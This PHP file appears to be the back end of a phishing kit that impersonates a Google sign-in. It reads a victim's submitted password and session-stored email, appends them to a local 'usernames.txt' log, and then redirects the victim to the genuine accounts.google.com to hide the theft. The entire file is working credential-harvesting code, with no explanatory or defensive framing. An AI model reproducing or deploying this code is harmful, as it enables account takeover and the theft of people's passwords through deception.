<?php
include 'ip.php';
			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
  			$file = fopen("usernames.txt", "a") or die("Unable to open file!");
			
  			 
  			fwrite($file, "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass.PHP_EOL);			
  			fclose($file);
			
  			
  			
  			header("Location: https://accounts.google.com");
			exit();
			
			
			session_destroy();
			
?>
